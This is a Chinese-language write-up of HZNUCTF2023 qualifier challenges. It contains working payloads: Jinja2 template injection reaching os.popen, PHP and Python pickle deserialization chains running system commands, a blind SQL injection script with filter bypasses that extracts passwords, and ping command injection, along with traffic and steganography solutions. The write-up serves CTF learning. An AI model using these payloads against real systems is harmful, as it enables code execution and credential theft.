## HZNUCTF2023初赛

### WEB

#### ezflask

登录看到这样的提示，说明需要get传参

<img src="https://s2.loli.net/2023/03/26/7rj5KJdemRUOD9L.png" alt="image-20230326215926968" style="zoom:33%;" />

然后我们传一个123过去：

![image-20230326220057174](https://s2.loli.net/2023/03/26/bvxH6uftKaZn3GN.png)

发现被颠倒过来了，我们结合题目flask，推断这可能是一个`flask ssti`模板注入漏洞

我们先构造 `{{3*4}}` 反过来 `}}4*3{{`

<img src="https://s2.loli.net/2023/03/26/FXj6xGwQPzLE7Nk.png" alt="image-20230326220305580" style="zoom:33%;" />

发现成功被执行，存在ssti漏洞

我们先使用 

```python
{{''.__class__.__bases__[0].__subclasses__()}}
```

查看所有可以使用的类，代码：

```python
import urllib.parse
str = "{{''.__class__}}"
print(urllib.parse.quote(str[::-1]))

输出：
%7D%7D%29%28__sessalcbus__.%5D0%5B__sesab__.__ssalc__.%27%27%7B%7B
```

![image-20230326220700394](https://s2.loli.net/2023/03/26/ANLRqhlYVs46TBg.png)

发现成功被执行，成功回显出来

然后我们可以使用 `jinja2`的条件语句的写法，获得可以命令执行的类

```python
import urllib.parse

str = """{% for c in [].__class__.__base__.__subclasses__() %}
{% if c.__name__ == 'catch_warnings' %}
  {% for b in c.__init__.__globals__.values() %}
  {% if b.__class__ == {}.__class__ %}
    {% if 'eval' in b.keys() %}
      {{ b['eval']('__import__("os").popen("ls /").read()') }}
    {% endif %}    
  {% endif %}
  {% endfor %}
{% endif %}
{% endfor %}""" # 通过遍历，拿到代码执行函数eval，进而实现操作

print(urllib.parse.quote(str[::-1]))

输出：
%7D%25%20rofdne%20%25%7B%0A%7D%25%20fidne%20%25%7B%0A%7D%25%20rofdne%20%25%7B%20%20%0A%7D%25%20fidne%20%25%7B%20%20%0A%7D%25%20fidne%20%25%7B%20%20%20%20%0A%7D%7D%20%29%27%29%28daer.%29%22/%20sl%22%28nepop.%29%22so%22%28__tropmi__%27%28%5D%27lave%27%5Bb%20%7B%7B%20%20%20%20%20%20%0A%7D%25%20%29%28syek.b%20ni%20%27lave%27%20fi%20%25%7B%20%20%20%20%0A%7D%25%20__ssalc__.%7D%7B%20%3D%3D%20__ssalc__.b%20fi%20%25%7B%20%20%0A%7D%25%20%29%28seulav.__slabolg__.__tini__.c%20ni%20b%20rof%20%25%7B%20%20%0A%7D%25%20%27sgninraw_hctac%27%20%3D%3D%20__eman__.c%20fi%20%25%7B%0A%7D%25%20%29%28__sessalcbus__.__esab__.__ssalc__.%5D%5B%20ni%20c%20rof%20%25%7B
```

在根目录下，疑似flag：

![image-20230326221009529](https://s2.loli.net/2023/03/26/xgSIMD3vT2UwnBE.png)

我们使用 `cat /flag.sh`  查看：

![image-20230326221111088](https://s2.loli.net/2023/03/26/T6kmGin74sOYSZe.png)

发现flag.sh被删除了，flag不在这里，然后赶紧查了一下`bash`中`export`的作用，发现好像是关于环境变量的，于是我们需要查询环境变量的值

> **env** 是一个 外部命令 ， 程序文件 /bin/env，列出所有 环境变量 及其赋值。 Linux 系统里的**env命令**可以显示当前用户的 环境变量 ，还可以用来在指定环境变量下执行其他命令。

查询可知，我们可以使用 **env**命令去查询环境变量，于是脚本如下：

```python
import urllib.parse

str = """{% for c in [].__class__.__base__.__subclasses__() %}
{% if c.__name__ == 'catch_warnings' %}
  {% for b in c.__init__.__globals__.values() %}
  {% if b.__class__ == {}.__class__ %}
    {% if 'eval' in b.keys() %}
      {{ b['eval']('__import__("os").popen("env").read()') }}
    {% endif %}
  {% endif %}
  {% endfor %}
{% endif %}
{% endfor %}"""
print(urllib.parse.quote(str[::-1]))

输出：
%7D%25%20rofdne%20%25%7B%0A%7D%25%20fidne%20%25%7B%0A%7D%25%20rofdne%20%25%7B%20%20%0A%7D%25%20fidne%20%25%7B%20%20%0A%7D%25%20fidne%20%25%7B%20%20%20%20%0A%7D%7D%20%29%27%29%28daer.%29%22vne%22%28nepop.%29%22so%22%28__tropmi__%27%28%5D%27lave%27%5Bb%20%7B%7B%20%20%20%20%20%20%0A%7D%25%20%29%28syek.b%20ni%20%27lave%27%20fi%20%25%7B%20%20%20%20%0A%7D%25%20__ssalc__.%7D%7B%20%3D%3D%20__ssalc__.b%20fi%20%25%7B%20%20%0A%7D%25%20%29%28seulav.__slabolg__.__tini__.c%20ni%20b%20rof%20%25%7B%20%20%0A%7D%25%20%27sgninraw_hctac%27%20%3D%3D%20__eman__.c%20fi%20%25%7B%0A%7D%25%20%29%28__sessalcbus__.__esab__.__ssalc__.%5D%5B%20ni%20c%20rof%20%25%7B
```

我们执行一下：

![image-20230326221458673](https://s2.loli.net/2023/03/26/JlGOX7ECzxU23PY.png)

成功拿到flag



#### ppppop

访问的时候，一片空白，我们使用bp抓包：

![image-20230326223354302](https://s2.loli.net/2023/03/26/l71encTkJ2ZsV93.png)

将cookie进行base64解密：

```
O:4:"User":1:{s:7:"isAdmin";b:0;}
将0改为1，base64编码：
Tzo0OiJVc2VyIjoxOntzOjc6ImlzQWRtaW4iO2I6MTt9
```

我们使用新的cookie去访问，得到源码：

```php
<?php
error_reporting(0);
include('utils.php');

class A {
    public $className;
    public $funcName;
    public $args;

    public function __destruct() {
        $class = new $this->className;
        $funcName = $this->funcName;
        $class->$funcName($this->args);
    }
}

class B {
    public function __call($func, $arg) {
        $func($arg[0]);
    }
}

if(checkUser()) {
    highlight_file(__FILE__);
    $payload = strrev(base64_decode($_POST['payload']));
    unserialize($payload);
} 
```



很简单的反序列化题，我们直接构造一条链：命令执行

```php
<?php

class B
{

}
class A
{
    public $className;
    public $funcName;
    public $args;

    public function __construct()
    {
        $this->className = "B";
        $this->funcName = "system";
        $this->args = 'env';
    }
}

echo base64_encode(strrev(serialize(new A())));

输出：
   fTsidm5lIjozOnM7InNncmEiOjQ6czsibWV0c3lzIjo2OnM7ImVtYU5jbnVmIjo4OnM7IkIiOjE6czsiZW1hTnNzYWxjIjo5OnN7OjM6IkEiOjE6Tw==
```

这一题的flag也在环境变量中



#### ezlogin

一个sql注入题，考察布尔盲注

![image-20230326225154945](https://s2.loli.net/2023/03/26/9UbvOKz6eDT3SZg.png)

源码提示，在username中过滤了一些关键字，但是可以进行大小写绕过。

经过测试，还过滤了其他的字符，比如：`=、空格`，`=`使用 `like` 代替，`空格`使用 `/*1*/`代替

我们可以使用bp进行fuzz，查看过滤了哪些字符，这里就不试了

我们测试发现注入点是`username`，使用单引号闭合

注意我们需要将username先反转过来，然后base64编码

这里直接上脚本，flag在user表的password字段中：

```python
import base64
import requests
url = "http://4f284e5b-fcc3-4418-822c-4527a362b52d.ite.hznu.edu.cn/"
words = '0123456789abcdefghijklmnopqrstuvwxyz-{},'
flag = ''
for i in range(50):
    for j in words:
        # payload = "'/*1*/or/*1*/if((substr((SeLect/*1*/DatAbase()),{},1)/*1*/like/*1*/'{}'),1,0)#".format(i, j)
        # database:users
        # payload = "'/*1*/or/*1*/if((substr((SeLect/*1*/group_concat(table_name)/*1*/from/*1*/information_schema.tables/*1*/where/*1*/table_schema/*1*/like/*1*/Database()),{},1)/*1*/like/*1*/'{}'),1,0)#".format(i, j)
        # table:user
        # payload = "'/*1*/or/*1*/if((substr((SeLect/*1*/group_concat(column_name)/*1*/from/*1*/information_schema.columns/*1*/where/*1*/table_name/*1*/like/*1*/'user'),{},1)/*1*/like/*1*/'{}'),1,0)#".format(i, j)
        # hostuserpasswordselectprivinsertprivu
        payload = "'/*1*/or/*1*/if((substr((SeLect/*1*/password/*1*/from/*1*/user/*1*/limit/*1*/1,1),{},1)/*1*/like/*1*/'{}'),1,0)#".format(i, j)

        payload = payload[::-1]
        payload = base64.b64encode(payload.encode()).decode()
        post = {
            'username': payload,
            'passwd': '123456'
        }

        res = requests.post(url=url, data=post)
        # print(res.text)
        if 'success' in res.text:
            flag += j
            print("flag:" + flag)
            if j == '}':
                break
```





#### ezpickle

一个简单的pickle反序列化

```python
import base64
import pickle
from flask import Flask, request

app = Flask(__name__)


@app.route('/')
def index():
    with open('app.py', 'r') as f:
        return f.read()


@app.route('/calc', methods=['GET'])
def getFlag():
    payload = request.args.get("payload")
    pickle.loads(base64.b64decode(payload).replace(b'os', b''))
    return "ganbadie!"


@app.route('/readFile', methods=['GET'])
def readFile():
    filename = request.args.get('filename').replace("flag", "????")
    with open(filename, 'r') as f:
        return f.read()


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80)
```

因为此处有一个读文件路由 `readFile`，所以我们可以利用`tee`命令，将flag放入文件中

因为此处过滤的关键字 `os`，所以我们可以使用拼接绕过，直接给脚本：

```python
import base64
import pickle


class Evil():
    def __reduce__(self):
        cmd = ("__import__('o'+'s').system('env | tee 1.txt')",)
        return (eval, cmd)


print(base64.b64encode(pickle.dumps(Evil())))

输出：
b'gASVSQAAAAAAAACMCGJ1aWx0aW5zlIwEZXZhbJSTlIwtX19pbXBvcnRfXygnbycrJ3MnKS5zeXN0ZW0oJ2VudiB8IHRlZSAxLnR4dCcplIWUUpQu'
```

然后我们传参：（注意不要加上b和引号）：

<img src="https://s2.loli.net/2023/03/26/BAR91hw4JjNZdyL.png" alt="image-20230326232415534" style="zoom:33%;" />

成功写入，然后我们直接读：

![image-20230326232509037](https://s2.loli.net/2023/03/26/6gYB4wzmnqeAysD.png)



#### 猜猜猜

> hint1: tnih
>
> hint2: ping？pong！

![image-20230326224206906](https://s2.loli.net/2023/03/26/3cOZiE5DBX7LJyP.png)

根据提示，我们输入： `thih`

![image-20230326224330872](https://s2.loli.net/2023/03/26/4Eq7a5u21XjUDMr.png)

这里提示我们需要命令执行，而不是sql注入

然后结合hint2，我们可以先 `ping 127.0.0.1`，但是需要翻着输入：

```
1.0.0.721 gnip
```

![image-20230326224519411](https://s2.loli.net/2023/03/26/nrV1tewb6THKqYB.png)

然后我们使用管道符 `|` 查看当前目录下的文件

```
sl | 1.0.0.721 gnip
```

![image-20230326224635973](https://s2.loli.net/2023/03/26/Md7PCn59NAuSbJi.png)

成功命令执行，然后猜flag在环境变量中：

```
ping 127.0.0.1 | env

vne | 1.0.0.721 gnip
```

![image-20230326224745021](https://s2.loli.net/2023/03/26/4x8TVGeYtD3MIWQ.png)

读取到flag



### MISC

#### traffic

下载后得到一个流量包，提示说是sql，

![image-20230326234349523](C:\Users\LIKE\AppData\Roaming\Typora\typora-user-images\image-20230326234349523.png)

发现在进行sql注入，我们使用`tshark`将`http post`请求的sql数据提取出来

```
tshark -r traffic.pcapng -Y "http.request" -T fields -e http.file_data > data1.txt
```

![image-20230326234850958](https://s2.loli.net/2023/03/26/eapYGoKxE9kQ3qM.png)

然后需要将其url解码，

![image-20230327102551622](https://s2.loli.net/2023/03/27/zQwWTROco4YB5il.png)

经过分析，判断flag就是看判断条件是否存在感叹号`！`

我们写个脚本去提取flag

```python
from urllib import parse
import re

f = open("C://Users/LIKE/Desktop/data.txt", "r")
data = f.readlines()
for line in data:
    line = parse.unquote(line.replace("\n", ""))
    findFlag = re.search("flag", line)
    findEq = re.search("!=", line)

    if findFlag and findEq:
        pattern = r"\)\)!=(\d+)\),"
        match = re.search(pattern, line)
        print(chr(int(match.group(1))), end="")
```

这是大佬的脚本

```python
import urllib.parse
import re

with open('data1.txt','r') as f:
    file = f.readlines()

res = ""
for line in file:
    # url解码
    line = urllib.parse.unquote(line.replace('\n', ''))
    # 寻找flag的字段
    findflag = re.findall("flag",line)
    findeq = re.findall("!=",line)
    if len(findflag) != 0 and len(findeq) != 0:
        # 正则匹配ascii值
        line = line.replace('\n', '')
        pattern = r"\bMID\(\(.*?,(.*?),1\)\)\!=([^),]+)"
        match = re.search(pattern, line)

        if match:
            win = match.group(2)
            res += chr(int(win))

print(res)
```



#### pricture

> 这颜色怎么怪怪的
>
> hint1: 看看通道
>
> hint2: rgb value

![flag222](https://s2.loli.net/2023/03/27/BoO1Vcmsd87e5fL.png)

我们使用zsteg命令查看：

> zsteg可以**检测PNG和BMP图片里的隐写数据**

```
zsteg -a flag222.png
```

![image-20230327113333447](https://s2.loli.net/2023/03/27/e3PNFXioGD2RB6v.png)

发现通道中隐藏着一张png图片（-a是将所以可能的组合试了一下）

我们使用`-E`参数进行分离：

```
zsteg -E b8,rgb,lsb,xy flag222.png > flag.png
```

<img src="https://s2.loli.net/2023/03/27/zloBeUTDIp9qy2v.png" alt="flag" style="zoom:25%;" />

得到如下图片，然后我们使用`stegsolve`进行查看：

![image-20230327113614247](https://s2.loli.net/2023/03/27/r6vhTgd4xyDnOY9.png)

在通道1中发现图片，我们提取出来，是一张二维码，扫码得到flag：

<img src="https://s2.loli.net/2023/03/27/zEmVYJetMSLDoKr.png" alt="qr" style="zoom:25%;" />











